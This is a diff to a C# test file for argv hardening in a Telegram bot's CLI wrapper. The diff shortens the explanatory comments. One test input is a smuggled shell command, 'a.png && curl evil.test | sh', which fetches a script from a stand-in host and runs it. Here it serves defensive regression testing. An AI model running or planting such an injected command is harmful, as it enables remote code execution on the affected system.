@@ -4,12 +4,7 @@ using Stencil.TelegramBot.Infrastructure.Cli;
 
 namespace Stencil.TelegramBot.Tests;
 
-/// <summary>
-/// argv-hardening regressions for <see cref="CliArgvBuilder"/>. argv is a token array handed to
-/// <c>ProcessStartInfo.ArgumentList</c> with <c>UseShellExecute=false</c>, so no shell parses
-/// these values; the one residual vector is flag injection through the positional output
-/// operand, which BuildArgv rejects (mirroring <c>build_argv</c> in mcp's <c>args.rs</c>).
-/// </summary>
+/// <summary>argv is a token array handed to <c>ProcessStartInfo.ArgumentList</c> with <c>UseShellExecute=false</c>, so no shell parses it; the residual vector is flag injection through the positional output operand, which BuildArgv rejects (mirroring mcp's <c>args.rs</c>).</summary>
 public sealed class CliArgvHardeningTests
 {
     [Theory]
@@ -22,9 +17,8 @@ public sealed class CliArgvHardeningTests
     [InlineData("a.png && curl evil.test | sh")]
     public void Should_Keep_A_Hostile_Flag_Value_As_One_Operand_That_Cannot_Introduce_A_Flag(string hostile)
     {
-        // input/crop/filter are all flag *values*: whatever their content, each rides argv as
-        // exactly one element immediately after its own flag, so it can never become a
-        // separate CLI flag or split into extra tokens.
+        // input/crop/filter are flag *values*: whatever their content, each rides argv as exactly one element
+        // after its own flag, so it can never become a separate flag or split into extra tokens.
         EditRequest req = new()
         {
             Input = hostile,
@@ -85,9 +79,8 @@ public sealed class CliArgvHardeningTests
     [Fact]
     public void Should_Return_A_Token_List_For_Argument_List_Without_A_Shell_From_Build_Argv()
     {
-        // Structural, not a convention: SpawnAsync feeds this list one element at a time into
-        // ProcessStartInfo.ArgumentList with UseShellExecute=false, never a joined command
-        // string, so a space-bearing value staying one token here means nothing re-splits it.
+        // Structural: SpawnAsync feeds this list into ProcessStartInfo.ArgumentList with UseShellExecute=false,
+        // never a joined string, so a space-bearing value staying one token here means nothing re-splits it.
         EditRequest req = new()
         {
             Input = "my file with spaces.png",
